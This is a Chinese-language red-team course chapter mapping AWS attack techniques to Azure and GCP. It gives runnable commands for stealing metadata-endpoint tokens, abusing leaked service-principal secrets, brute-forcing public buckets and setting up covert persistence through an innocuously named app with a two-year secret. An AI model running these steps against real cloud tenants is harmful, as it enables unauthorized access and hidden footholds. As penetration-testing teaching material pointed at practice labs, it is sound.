# Ch 38 — Azure / GCP 攻擊速成：把 AWS 學的映射過去

> **目標**：把前三十幾章建立的 AWS 攻擊直覺，快速遷移到 Azure 和 GCP——不是從零開始，而是找對應物、識別差異、理解為什麼這個雲的設計讓同一個攻擊思路在這裡看起來不一樣。

---

## 為什麼需要

你已經能拿 EC2 IMDS token、做 IAM 提權、找公開 S3 bucket。但現實中的目標環境有一半跑在 Azure 或 GCP 上，或者三雲都有。

多雲環境有個特性：安全設定往往最弱的那朵雲決定整體風險。Azure 上一個設定錯誤的 Managed Identity，可以拿到 token 再橫移到 GCP 的 Workload Identity Federation，最後繞回 AWS 的 cross-account role。不懂另外兩朵雲，你就看不見整條攻擊鏈。

本章的定位是**映射**，而不是重新建立知識體系。每個概念都有 AWS 對應物，從那裡出發，差異才有意義。

---

## 先建直覺：三雲攻擊面對照

攻擊雲端環境的根本邏輯只有一條：**找身份、找過度授權、用身份做你沒被允許做的事**。這條邏輯在三朵雲上完全一樣，差異只在身份的名字叫什麼、credential 的格式是什麼、枚舉的工具是哪個。

先把最重要的對應關係釘在腦子裡：

```
攻擊面          AWS                    Azure                   GCP
───────────────────────────────────────────────────────────────────────────────
IAM 體系        IAM (Users/Roles/      Entra ID + Azure        Cloud IAM
                Policies)              RBAC (兩套)             (Members/Roles/Bindings)

服務身份        IAM Role (assume)      Service Principal /     Service Account
                                       Managed Identity

VM 身份         EC2 Instance Profile   VM Managed Identity     Compute Engine SA

Metadata        169.254.169.254        169.254.169.254         metadata.google.internal
endpoint        /latest/meta-data/     /metadata/instance?     /computeMetadata/v1/
                需 IMDSv2 token         api-version=...         需 Metadata-Flavor header

儲存體          S3 (Bucket/Object      Storage Account /       GCS (Bucket)
                ACL/Bucket Policy)     Blob Container

稽核日誌        CloudTrail             Azure Monitor /         Cloud Audit Logs
                                       Activity Log            (Admin/Data/System)
```

三雲的根本區別：
- **AWS**：IAM 是單一體系，policy 是 JSON document，全局一致。
- **Azure**：有兩套並存的 IAM——Azure RBAC（控資源）和 Entra ID Role（控身份目錄本身），這兩套不互通，枚舉時都要看。
- **GCP**：IAM binding 直接綁在資源上，沒有 AWS policy document 那種獨立實體，`actAs` 這個 permission 是 GCP 獨有的危險點。

---

## Azure 攻擊

### Entra ID 身份模型

Azure 的身份體系叫 **Entra ID**（舊名 Azure Active Directory，縮寫 Entra ID 或 AAD），這是 Azure 的身份平面，和 AWS IAM 是不同維度的概念。

資源層級結構從大到小：

```
Management Group（跨訂閱治理）
    └── Subscription（訂閱，計費單位，資源的頂層容器）
            └── Resource Group（資源群組，邏輯分組）
                    └── Resource（VM / Storage / Key Vault / ...）
```

身份類型三種，對應 AWS 概念：

- **User**：人類帳號，對應 AWS IAM User。有密碼 + MFA。
- **Service Principal（SP）**：非人類身份，應用程式用來呼叫 Azure API 的身份。對應 AWS IAM Role（有 credential，可以 assume）。建立 SP 時會產生 clientId + clientSecret（或 certificate），這是攻擊者最想拿的東西。
- **Managed Identity**：Azure 平台自動管理 credential 的服務身份，運行在 VM 或 Container 上時可直接從 Metadata 拿 token，不需要存 secret。對應 AWS EC2 Instance Profile（IAM Role attached to EC2）。

**Azure RBAC vs Entra ID Role 的差異** 是 Azure 特有的陷阱：

| 維度 | Azure RBAC | Entra ID Role |
|------|-----------|---------------|
| 控制什麼 | Azure 資源（VM、Storage、Key Vault 等） | Entra ID 本身（User、Group、App 管理） |
| 作用域 | Management Group / Subscription / Resource Group / Resource | Tenant 層級，全局 |
| 例子 | Contributor（寫資源）、Reader | Global Administrator、Application Administrator |
| 枚舉指令 | `az role assignment list` | `az ad user get-member-objects` |

攻擊者枚舉時兩套都要跑，只跑一套會漏掉一半的授權。

---

### Azure Metadata Endpoint

Azure VM 上的 IMDS（Instance Metadata Service）位址和 AWS 一樣是 `169.254.169.254`，但有一個關鍵差異：只需要帶一個 HTTP header `Metadata: true`，不需要 AWS IMDSv2 那樣先取 session token。

取 Managed Identity 的 access token：

```bash
# 在 Azure VM 內部執行
# resource 參數是你要存取的 Azure 服務端點
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01\
&resource=https://management.azure.com/" | python3 -m json.tool
```

回傳格式是 OAuth2 Bearer token，欄位包含 `access_token`、`expires_on`、`resource`、`token_type`。

```bash
# 取到 token 後，呼叫 Azure Resource Manager API
# 列出當前訂閱下的所有資源群組
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01\
&resource=https://management.azure.com/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

SUBSCRIPTION_ID="your-subscription-id"

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourcegroups\
?api-version=2021-04-01" | python3 -m json.tool
```

**與 AWS 的安全性差異**：

AWS IMDSv2 要求先取 PUT session token（`X-aws-ec2-metadata-token-ttl-seconds`），再帶著這個 token 做 GET，SSRF 攻擊難度較高（SSRF 通常只能做 GET）。Azure IMDS 只需要一個 header，SSRF 如果能控制 header 就能直接打。但 Azure 的 token 是 OAuth2 Bearer，scope 是你指定的 `resource`，不同服務需要不同的 token，沒有 AWS STS AssumeRole 那樣的跨服務一票通用概念。

**本段未實測，為理論預期行為**。自驗方法：在 Azure 訂閱開一台 Ubuntu VM，啟用 System Assigned Managed Identity，在 VM 上跑上述 curl 指令，確認 token 回傳格式與欄位名稱。

---

### Azure 提權路徑

**路徑一：Service Principal clientSecret 洩漏**

SP 的 clientSecret 常見於：
- `.env` 檔、Dockerfile、GitHub repo
- Azure DevOps pipeline 設定
- 應用程式設定頁面（有時截圖洩漏）

拿到 clientId + tenantId + clientSecret 後：

```bash
# 登入 Azure CLI 為 Service Principal
az login --service-principal \
  --username <clientId> \
  --password <clientSecret> \
  --tenant <tenantId>

# 檢查這個 SP 有哪些 role assignment
az role assignment list \
  --assignee <clientId> \
  --all \
  --output table

# 檢查 Entra ID role
az ad user get-member-objects --id <objectId> --security-enabled-only
```

`az role assignment list --all` 的 `--all` 很重要：沒有這個 flag 預設只顯示目前訂閱的 assignment，Management Group 層級的不會出現。

**路徑二：VM 上 Managed Identity token 偷取**

在 SSRF 或 RCE 場景下，從 VM 的 IMDS 拿 token，再用 `az rest` 做 API 呼叫：

```bash
# 用偷到的 token 做 API 呼叫（不需要 az login）
az rest \
  --method GET \
  --url "https://management.azure.com/subscriptions?api-version=2022-12-01" \
  --headers "Authorization=Bearer ${TOKEN}"

# 列出所有 Storage Account（找下一個攻擊面）
az rest \
  --method GET \
  --url "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
  --headers "Authorization=Bearer ${TOKEN}"
```

這個 token 的 resource scope 是 `https://management.azure.com/`，只能呼叫 ARM API；如果要呼叫 Entra ID Graph API（`https://graph.microsoft.com/`）需要另外取一個 token 換不同 resource。

**關鍵枚舉工具**：

- **ROADtools**：專門枚舉 Entra ID（Azure AD），可以把 tenant 的 User、Group、Application、SP、Role assignment 全部 dump 下來，輸出成 SQLite 供後續查詢。

```bash
# 安裝
pip install roadtools

# 用 access token 收集 Entra ID 資料（需要 AAD Graph token）
roadrecon gather --access-token <entra-id-token>

# 啟動本地 Web UI 查詢
roadrecon gui
```

**本段未實測，為理論預期行為**。自驗方法：在測試 tenant 建一個有 Reader 權限的 SP，用其 token 跑 `roadrecon gather`，確認能列出 User 和 Application。

- **MicroBurst**：PowerShell 模組，枚舉 Azure 訂閱下的資源，包含 Storage Account、Key Vault、Function App、App Service 設定等。

```powershell
# 安裝
Install-Module -Name MicroBurst

# 枚舉訂閱下的所有資源
Invoke-EnumerateAzure -Verbose

# 找公開的 Storage blob
Invoke-EnumerateAzureBlobs -Base "targetcompany"
```

---

### Azure 儲存體攻擊面

Azure Blob Storage 的攻擊面對應 S3，但名字不同：

- **Storage Account**：頂層容器，對應 AWS 帳號層級的 S3 endpoint（`account.blob.core.windows.net`）
- **Container**：對應 S3 Bucket
- **Blob**：對應 S3 Object

三種常見誤配：

1. **Public Container**：Container 的 access level 設成 `Blob`（任何人可讀 blob）或 `Container`（任何人可列舉）。URL 格式：`https://<account>.blob.core.windows.net/<container>/<blob>`
2. **SAS Token 洩漏**：Shared Access Signature token 可以讓任何持有者存取特定資源，token 如果被 commit 進 repo 或印在截圖裡，沒有其他身份驗證機制能擋。
3. **Storage Account Key 洩漏**：每個 Storage Account 有兩把 512-bit master key，等同 root credential，任何人拿到就能讀寫所有資料。

公開 Container 枚舉工具：**BlobHunter**

```bash
# 枚舉目標公司名稱相關的公開 Azure Blob
python BlobHunter.py -a targetcompany
```

BlobHunter 會嘗試常見的 Storage Account 命名模式（`targetcompany`、`targetcompanyprod`、`targetcompanystorage` 等），找到後檢查 Container 是否公開可讀。

---

### Azure 持久化

拿到足夠權限後，Azure 常見的持久化手法：

**手法一：建立 Application + 新增 Secret（長效 SP）**

Application 的 clientSecret 最長可設 24 個月，而且 Entra ID 的稽核日誌對「新增 secret」這個動作的告警通常沒有 CloudTrail 嚴格。

```bash
# 建立新 Application
az ad app create --display-name "LegitSoundingName"

# 取得 appId
APP_ID=$(az ad app list --display-name "LegitSoundingName" \
  --query "[0].appId" -o tsv)

# 建立 SP
az ad sp create --id $APP_ID

# 新增 secret（有效期 2 年）
az ad app credential reset --id $APP_ID \
  --years 2 \
  --append
```

**手法二：Guest Account 邀請（跨 Tenant）**

如果你有夠高的 Entra ID 權限（至少 Guest Inviter 角色），可以把攻擊者控制的 Microsoft 帳號作為 Guest 邀請進目標 tenant。Guest account 在很多 tenant 預設有基本的 Entra ID 讀取權限（能列 User），但不能做資源操作——前提是 Guest 的 RBAC assignment 有設錯。這個技術的優點是不需要在目標 tenant 建新 User，來源是攻擊者自己的外部帳號，難以被 off-boarding 流程清除。

---

## GCP 攻擊

### GCP IAM 模型

GCP 的 IAM 模型比 AWS 更扁平，也比 Azure 更統一（沒有兩套並存的問題），但有幾個 GCP 獨有的設計值得特別記憶。

**Member 類型**：

- `user:` — Google 帳號（對應 AWS IAM User / Azure User）
- `serviceAccount:` — 服務帳號（Service Account，簡稱 SA），這是 GCP 非人類身份的唯一形式，對應 AWS IAM Role
- `group:` — Google Group，成員會繼承 group 的 binding
- `domain:` — 整個 GSuite/Workspace domain 的所有 member
- `allAuthenticatedUsers` — 所有登入 Google 帳號的人（這是危險的設定）
- `allUsers` — 完全匿名（這更危險）

**Role 類型**：

- **Basic Role**：`roles/owner`、`roles/editor`、`roles/viewer`——這三個是遺留設計，粒度極粗，`editor` 等同 AWS PowerUser，`owner` 等同 AdministratorAccess。現代 GCP 環境不該用 Basic Role，但舊專案常見。
- **Predefined Role**：GCP 針對各服務定義的細粒度 role（例如 `roles/storage.objectViewer`），對應 AWS managed policy。
- **Custom Role**：自定義 permission 集合，對應 AWS customer managed policy。

**IAM Binding vs Condition**：

IAM binding 是把「member + role」綁到一個資源上：

```json
{
  "role": "roles/compute.instanceAdmin",
  "members": ["serviceAccount:my-sa@project.iam.gserviceaccount.com"],
  "condition": {
    "title": "only-prod",
    "expression": "resource.name.startsWith('projects/my-project/zones/us-central1-a')"
  }
}
```

`condition` 是 CEL（Common Expression Language）表達式，可以限制 binding 的生效範圍。攻擊者枚舉 binding 時要同時看 condition，有 condition 的 binding 比沒有的更難直接濫用。

---

### GCP Metadata Server

GCP 的 Metadata server 位址是 `http://metadata.google.internal/computeMetadata/v1/`，必須帶 header `Metadata-Flavor: Google`，否則回傳 403——這是 GCP 故意的 CSRF/SSRF 防護。

取 Service Account access token：

```bash
# 在 GCP VM / Container 內部執行
# 如果 VM 有綁多個 SA，預設取第一個（通常是 default）
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

回傳格式：
```json
{
  "access_token": "ya29.c.b0...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

注意：這個 `access_token` 是 OAuth2 Bearer token，格式和 AWS STS 完全不同（AWS 給的是 `AccessKeyId` + `SecretAccessKey` + `SessionToken` 三件組）。GCP 的 token 只有一個字串，直接當 Bearer token 用。

取 project-id（常常是後續 API 呼叫需要的參數）：

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
```

邊界案例：如果 SSRF 工具不能控制 request header，`Metadata-Flavor: Google` 就帶不上去，GCP Metadata server 會回傳 403，攻擊失敗。這是 GCP 比 Azure IMDS 防禦更強的地方（Azure 只需要 `Metadata: true`，多數 SSRF 場景都能帶 header）。

**本段未實測，為理論預期行為**。自驗方法：在 GCP 開一台 Compute Engine VM，啟用 Compute Engine default service account，在 VM 上跑上述 curl 指令，驗證 header 缺失時確實收到 403。

---

### GCP 提權路徑

**核心概念：`actAs` permission**

這是 GCP 最重要、也最容易被忽略的 permission：`iam.serviceAccounts.actAs`。

含義：允許你「以某個 SA 的身份執行操作」。凡是需要指定 SA 的 gcloud 操作——建 VM 時綁 SA、部署 Cloud Function 時綁 SA、建 Dataflow job 時綁 SA——都需要呼叫者對目標 SA 有 `actAs`。

AWS 的對應物是 `iam:PassRole`（允許把 IAM Role 傳遞給服務），但 `actAs` 比 `PassRole` 更難發現，原因是：`PassRole` 在你的 IAM policy document 裡白紙黑字寫著，但 `actAs` 是寫在目標 SA 的 IAM binding 上，不是你自己的 policy 上。

提權 scenario：你拿到一個 principal（user 或 SA）有 `iam.serviceAccounts.actAs` 對某個 SA，而那個 SA 有 `roles/editor` 或 `roles/iam.securityAdmin`。

```bash
# 列出目標 SA 的 IAM policy（看誰能 actAs 這個 SA）
gcloud iam service-accounts get-iam-policy \
  target-sa@project-id.iam.gserviceaccount.com

# 輸出示例：
# bindings:
# - members:
#   - serviceAccount:attacker-sa@project-id.iam.gserviceaccount.com
#   role: roles/iam.serviceAccountUser
# etag: BwX...
```

`roles/iam.serviceAccountUser` 包含 `iam.serviceAccounts.actAs`，是最常見的過度授權。

**從 VM default SA 出發**

GCP 每個 project 有一個 Compute Engine default SA，名稱格式是 `<project-number>-compute@developer.gserviceaccount.com`。

舊版 GCP project 中，這個 SA 預設有 `roles/editor`（Basic Role），這意味著 VM 上的 workload 只要能打 Metadata server 就能拿到 token，再用這個 token 做幾乎任何事（讀 GCS、呼叫 Cloud Functions、存取 Secret Manager）。

新版 project 已縮減 default SA 的權限，但 Terraform 建出來的 GCP project 有時因為使用舊模組還是帶著 `editor` binding——這是工具鏈造成的歷史包袱，不是使用者主動設定的，特別難被發現。

枚舉工具：

- **gcpwn**：GCP 環境枚舉和攻擊工具，類似 Pacu for AWS。

```bash
# 安裝
pip install gcpwn

# 初始化 session（帶 service account key file）
gcpwn --project project-id \
      --key-file /path/to/sa-key.json

# 枚舉所有資源
> enum_resources
```

```bash
# 用 gcloud 直接枚舉 project 下的所有 IAM binding
gcloud projects get-iam-policy project-id \
  --format="json" | python3 -m json.tool

# 列出所有 SA
gcloud iam service-accounts list --project project-id

# 對每個 SA 查看誰有 actAs 權限
gcloud iam service-accounts get-iam-policy \
  <sa-email> --format json
```

---

### GCS（Google Cloud Storage）攻擊面

GCS 對應 S3，bucket 名稱全局唯一，URL 格式是 `https://storage.googleapis.com/<bucket-name>/<object>`。

兩個常見誤配：

1. **Legacy ACL + allUsers**：GCS 的舊式 ACL 系統允許把 `allUsers`（匿名）或 `allAuthenticatedUsers`（任何 Google 帳號）加到 bucket 或 object 的 ACL 上。如果開了這個，就是公開可讀。
2. **Uniform bucket-level access 未啟用**：如果沒啟用 Uniform bucket-level access，Object ACL 和 Bucket Policy 並存，一個 object 可能因為自己的 ACL 被設成 `allUsers` 而公開，即使 bucket 本身沒有開放。

枚舉工具：**GCPBucketBrute**

```bash
# 安裝依賴
pip install google-cloud-storage

# 枚舉目標名稱相關的公開 GCS bucket
python3 GCPBucketBrute.py \
  --keyword targetcompany \
  --wordlist wordlists/common_suffixes.txt \
  --output results.json
```

GCPBucketBrute 會嘗試 `targetcompany`、`targetcompany-backup`、`targetcompany-prod`、`targetcompany-dev` 等組合，對每個 bucket 嘗試列舉（`storage.buckets.get` + `storage.objects.list`），判斷是否公開可讀/可寫。

---

## 三雲攻擊技術全對照

| 攻擊類型 | AWS | Azure | GCP | 關鍵差異 |
|---------|-----|-------|-----|---------|
| IAM 提權 | Policy 誤配（過度 Action）、inline policy 注入、PassRole 濫用 | Role Assignment 過度授權（Azure RBAC）或 Entra ID Role 過高、SP secret 洩漏 | `actAs` 濫用、Basic Role（editor/owner）binding、自定 role permission 計算錯誤 | Azure 兩套 IAM 並存；GCP 的 `actAs` 寫在被冒用方的 binding 而非呼叫方 policy |
| Metadata endpoint | IMDSv2 要求 PUT 取 token 再 GET（SSRF 較難）；IMDSv1 已棄用但有些環境還開 | 只需 `Metadata: true` header；scope 由 `resource` 參數決定 | 必須帶 `Metadata-Flavor: Google`；無 header 回 403 | Azure SSRF 防護最弱；GCP header 要求可擋大部分 SSRF；AWS IMDSv2 設計最防禦 |
| 儲存體誤配 | S3 public bucket / ACL / unsigned URL | Public Container / SAS token 洩漏 / Storage Account Key | GCS allUsers ACL / Uniform access 未開 | Azure SAS token 不在 Entra ID 稽核日誌；GCP allUsers 在 legacy ACL 上特別隱蔽 |
| 身份持久化 | 建 IAM User + access key；建 IAM Role 供 attacker account assume | 建 Application + clientSecret（最長 24 個月）；邀請 Guest account 跨 tenant | 建 SA + 匯出 JSON key（key 永不過期直到手動刪）；在 Org 層級加 binding | GCP SA key 是永久 credential，不像 AWS STS 有 TTL；GCP Org 層級 binding 刪起來麻煩 |
| 日誌與偵測 | CloudTrail 紀錄所有 API call；GuardDuty 即時偵測；S3 Data Event 需手動開 | Activity Log（control plane）+ Resource Logs（data plane）分開；Storage diagnostic log 需啟用 | Admin Activity 預設開；Data Access log 預設關，需手動啟用；付費依 log volume | 三雲都有 data plane log 需手動開的問題；Azure SAS token 操作只有 Storage diagnostic log 記到 |
| 受管 K8s | EKS：IAM Authenticator，`aws-auth` ConfigMap 控 mapping；IRSA 綁 SA | AKS：Entra ID 整合；Pod Identity v2（Workload Identity）取代 aad-pod-identity | GKE：Workload Identity Federation，不允許 metadata server 直接取 SA token | EKS `aws-auth` ConfigMap 誤配是常見 CTF 題；GKE 的 WI 是三雲設計最嚴格的 |

---

## 工具對照

| 功能類型 | AWS | Azure | GCP |
|---------|-----|-------|-----|
| 主力攻擊框架 | Pacu | PowerZure / MicroBurst | gcpwn |
| 資源/權限枚舉 | CloudFox | AzureHound（BloodHound 族） | gcpwn |
| 多雲統一稽核 | ScoutSuite | ScoutSuite（支援 Azure） | ScoutSuite（支援 GCP） |
| AD/身份枚舉 | （不適用） | ROADtools（Entra ID 深度枚舉） | （不適用） |
| 公開儲存體掃描 | S3Scanner / BucketFinder | BlobHunter | GCPBucketBrute |
| 視覺化攻擊路徑 | PMapper | BloodHound CE + AzureHound | 無成熟工具，手動 |

ScoutSuite 是跨雲稽核的首選，同一套框架可以跑 AWS、Azure、GCP，輸出 HTML 報告，適合滲透測試報告交付。但它是稽核工具，不是攻擊框架——它告訴你哪裡有誤配，不幫你利用。

---

## 踩雷集錦

**1. Azure Metadata token 的 scope 模糊性**

從 `169.254.169.254` 拿到的 Azure token，scope 取決於你請求時帶的 `resource` 參數。Token 本身是 JWT，你可以 base64 decode payload 看 `scp`（scope）和 `oid`（object id）欄位，但 token 不會明確告訴你這個 Managed Identity 有哪些 role assignment。要知道權限邊界，還需要另外呼叫 ARM API 枚舉。這比 AWS 的 STS 難讀——AWS 的 assume-role credential 至少有 role ARN 在 response 裡。

**2. GCP 預設 SA 的 Editor 是新舊專案的時代傷痕**

`<project-number>-compute@developer.gserviceaccount.com` 在 2019 年前建的 GCP project 幾乎都帶 `roles/editor`。2019 年後新建的 project 已縮減，但 Terraform 用舊 module 或用 `google_project` resource 建的 project，很多 provider 版本還是會加 `editor` binding。滲透測試看到老 GCP project 先查這個 SA 的 IAM binding，幾乎保證有問題。

**3. Azure RBAC 和 Entra ID Role 是完全獨立的兩套系統**

`az role assignment list` 看到的是 Azure RBAC（資源層），`az ad user get-member-objects` 看到的是 Entra ID Role（身份目錄層）。很多工具只跑一套。有人拿到 `Global Administrator`（Entra ID Role）但 Azure RBAC 上什麼都沒有，有人反過來是 `Owner`（Azure RBAC）但 Entra ID Role 只是普通 user。兩套都要枚舉，不然會誤判權限邊界。

**4. GCP `actAs` 比 AWS PassRole 更難自動化找到**

AWS PassRole 的 `iam:PassRole` 寫在呼叫方的 policy 裡，`aws iam simulate-principal-policy` 可以直接測試。GCP 的 `actAs` 寫在被 actAs 的 SA 的 binding 上，你需要對每一個 SA 跑 `get-iam-policy` 才能知道誰有 `actAs`。專案裡有 50 個 SA，你要跑 50 次。gcpwn 的 `enum_resources` 幫你自動化這件事，手動做很容易漏。

**5. Azure SAS token 操作不在 Entra ID 稽核日誌裡**

SAS token 一旦產生，Azure 就不再追蹤這個 token 被誰用來做了什麼——因為 SAS 的設計原則是不需要身份驗證，只有 token 正確就通過。要追蹤 SAS token 的使用，必須在 Storage Account 的 Diagnostic Settings 裡手動啟用 Storage logs，且 log 會送到你指定的目的地（Log Analytics Workspace 或 Storage）。攻擊者用 SAS token 做的所有操作，在 Entra ID 的 Sign-in log 和 Activity log 裡完全看不到，是天然的偵測盲點。

---

## 進階延伸

**靶場練習**：

- **AzureGoat**（[https://github.com/ine-labs/AzureGoat](https://github.com/ine-labs/AzureGoat)）：IaC 建出來的有意設計成有漏洞的 Azure 環境，涵蓋 SSRF 到 Managed Identity token 竊取、Storage 誤配、Function App 程式碼注入。練 Azure 攻擊路徑首選。
- **GCP GOAT**（[https://github.com/JOSHUAJEBARAJ/GCP-GOAT](https://github.com/JOSHUAJEBARAJ/GCP-GOAT)）：類似設計，針對 GCP，包含 SA 提權、GCS 誤配、Cloud Function 攻擊。

**多雲 CSPM**：

**Wiz** 和 **Prisma Cloud**（原 Palo Alto Prisma）是主流多雲 CSPM（Cloud Security Posture Management）工具，能同時連接 AWS、Azure、GCP，產生統一的誤配報告和攻擊路徑圖（Wiz 的 Security Graph 功能）。紅隊視角是：Wiz 告訴你防守者知道什麼，所以你的初偵要比 Wiz 的默認檢查項更深。

**Azure PIM（Privileged Identity Management）**：

Azure 有個 AWS 沒有的功能——PIM（Privileged Identity Management），可以把高權限 role assignment 設為「Just-in-Time」，需要人工申請 + 審核才能啟用，啟用後有時效（1-8 小時）。滲透測試中如果碰到「我有 Global Administrator 的 eligible assignment 但現在是 inactive」，代表目標環境用了 PIM。繞過方式通常是找另一個沒用 PIM 的高權限路徑，或者找能批准 PIM request 的帳號。

**BloodHound CE + AzureHound**：

AzureHound 是 BloodHound Community Edition 的 Azure collector，可以把 Entra ID 和 Azure RBAC 的關係圖匯入 BloodHound，用 Cypher 查詢找攻擊路徑。這是紅隊做 Azure 環境分析的標配，比手動跑 `az` 指令快很多。

---

## 本章重點整理

- 三雲攻擊邏輯相同：找身份、找過度授權、找 Metadata endpoint。差異在身份名字和 credential 格式。
- Azure 有兩套並存的 IAM：Azure RBAC（控資源）和 Entra ID Role（控身份目錄），兩套都要枚舉。
- Azure Metadata endpoint 只需要 `Metadata: true` header，SSRF 防護比 AWS IMDSv2 弱；GCP 的 `Metadata-Flavor: Google` 要求能擋大部分 SSRF。
- GCP `actAs`（`iam.serviceAccounts.actAs`）是最危險的單一 permission，對應 AWS PassRole，但寫在被冒用 SA 的 binding 上而非呼叫方 policy 裡。
- GCP 舊 project 的 default Compute SA 常帶 `roles/editor`，是提權捷徑。
- Azure SAS token 操作不留在 Entra ID 稽核日誌，只在 Storage 自己的 diagnostic log 裡。
- 跨雲統一稽核用 ScoutSuite；Entra ID 深度枚舉用 ROADtools + AzureHound；GCP 全面枚舉用 gcpwn。

---

## 自我檢核

1. Azure 的 Managed Identity 和 Service Principal 有什麼差異？從攻擊者角度，哪個更有價值？為什麼？
2. 為什麼 GCP Metadata server 帶 `Metadata-Flavor: Google` 能防止 SSRF？AWS IMDSv2 的防護機制有什麼不同？
3. 一個 Azure 帳號有 `Contributor` role assignment 但沒有 Entra ID Role，它能做什麼？不能做什麼？
4. GCP `actAs` 和 AWS `iam:PassRole` 的相似之處和關鍵差異是什麼？為什麼 `actAs` 更難用自動化工具找到？
5. 你拿到了一個 GCP Service Account 的 JSON key file，接下來枚舉的前三步是什麼？
6. Azure SAS token 洩漏為什麼是一個特別難被偵測的攻擊向量？防守方應該怎麼設定才能看到 SAS token 的使用記錄？

---

## 延伸閱讀

1. **ROADtools 作者 Dirk-jan 的 Azure AD 攻擊系列博文**（[https://dirkjanm.io](https://dirkjanm.io)）— 枚舉 Entra ID 的最完整技術參考，ROADtools 的設計邏輯和使用場景在這裡有第一手解說。

2. **Google Cloud Security 官方文件：IAM best practices**（[https://cloud.google.com/iam/docs/using-iam-securely](https://cloud.google.com/iam/docs/using-iam-securely)）— 從防守側反向理解 `actAs` 為什麼危險、default SA 的風險，以及 Workload Identity 的正確設定方式。

3. **HackTricks Cloud**（[https://cloud.hacktricks.xyz](https://cloud.hacktricks.xyz)）— 社群維護的多雲攻擊技術 wiki，Azure 和 GCP 章節收錄了大量 CTF 和 real-world 的攻擊路徑，是快速查具體技術細節的最佳索引。

4. **"Hacking the Cloud" — Azure 和 GCP 章節**（[https://hackingthe.cloud](https://hackingthe.cloud)）— 每個條目都有真實的 API call 範例和對應的偵測方法，攻防並陳，適合查具體 TTPs。

5. **Wiz Research Blog**（[https://www.wiz.io/blog](https://www.wiz.io/blog)）— Wiz 的研究團隊定期發布真實雲端環境漏洞分析（IAM 誤配、supply chain、跨雲橫移），是理解現代雲端攻擊面如何演進的第一手資料。

---

本課程的技術章到這裡告一段落。你已經從 AWS IAM 基礎出發，走過容器逃脫、K8s 叢集接管、CI/CD 供應鏈、雲端偵測，到現在把 AWS 知識橫向擴展到 Azure 和 GCP。最後一步是把所有這些技術整合成一次完整的紅隊 engagement。

→ [Final Project：自架 vulnerable 雲+K8s lab，完整紅隊 engagement + 報告](./final-project-red-team-engagement.md)
